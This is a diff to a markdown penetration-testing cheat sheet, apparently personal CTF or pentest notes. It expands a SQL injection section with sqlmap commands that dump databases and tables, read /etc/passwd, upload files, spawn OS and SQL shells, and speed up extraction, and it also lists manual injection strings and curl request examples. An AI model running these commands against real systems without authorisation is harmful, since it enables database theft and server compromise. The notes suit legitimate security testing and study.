@@ -122,32 +122,75 @@ or open in vs code
 See [this page](../wiki/Cloud.md)
 
 # SQL Injection
-### SQLmap
+## SQLmap
+
+[SQLmap Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
+
+### Discovery
 ```bash
-# See Vulnerability
-sqlmap -r req --batch
-# Check Passwords
-sqlmap -r req --batch --passwords
-# Get DB
-sqlmap -r req --batch --dbs
-sqlmap -r req --batch --tables -D db
-sqlmap -r req --batch --dump -T table -D db
-# Check Privilege of DB
+sqlmap -r req
+# If you know info
+sqlmap -r req --os <os> --dbms <type db> --technique <tech>
+```
+
+- [List OS](https://github.com/sqlmapproject/sqlmap/wiki/Usage#force-the-database-management-system-operating-system-name)
+- [List DBMS](https://github.com/sqlmapproject/sqlmap/wiki/Usage#force-the-dbms)
+- [List Techniques](https://github.com/sqlmapproject/sqlmap/wiki/Usage#sql-injection-techniques-to-test-for)
+
+### Get DB
+```bash
+# List databases
+sqlmap -r req --predict-output --dbs
+# List Tables
+sqlmap -r req --predict-output --tables -D db
+# Dump Table
+sqlmap -r req --predict-output --dump -D db -T table 
+# Dump Column(s)
+sqlmap -r req --predict-output --dump -D db -T table -C column
+```
+
+### List Privileges
+```bash
+sqlmap -r req --current-user
 sqlmap -r req --privileges
+sqlmap -r req --roles
+```
+
+### File
+```bash
 # Read file
 sqlmap -r req --file-read=/etc/passwd
 # Upload file
 sqlmap -r req --file-write=/local/file --file-dest=/dest/path
 ```
 
-[SQLmap Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
+### Shell
+```bash
+# Upload Reverse shell
+sqlmap -r req --os-shell
+sqlmap -r req --os-cmd 'echo desbarres'
+# Sql Shell
+sqlmap -r req --sql-shell
+```
+
+### Optimize
+```
+-o                  Turn on all optimization switches
+--predict-output    Predict common queries output
+--keep-alive        Use persistent HTTP(s) connections
+--null-connection   Retrieve page length without actual HTTP response body
+--threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)
+
+--time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
+```
 
 ### Turbo SQLmap
 ```bash
 sqlmap -u 'https://example.com/?arg=*' --dump -T table_example -D example_db --level=2 --force-ssl --time-sec 1 --predict-output --dbms 'MySQL' --technique T  --flush-session
 ```
 
-### Pattern
+## Manual
+### Common pattern
 ```
 " OR ""="
 ' OR ''='
@@ -155,12 +198,19 @@ sqlmap -u 'https://example.com/?arg=*' --dump -T table_example -D example_db --l
 ```
 
 # Request
-### Curl
+## Curl
+### Send X-form
 ```bash
-curl 'http://example.com/login' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=login&password=pass'
+curl 'http://example.com/login' -H 'Content-Type: application/x-www-form-urlencoded' -sd 'username=login&password=pass'
 ```
 
-### Python (requests)
+### Send Json
+```bash
+curl -X POST https://example.com/api/submit -H "Content-Type: application/json" -sd '{"email":"lol@lol.com"}'
+```
+
+## Python
+### Requests
 ```python
 import requests
 
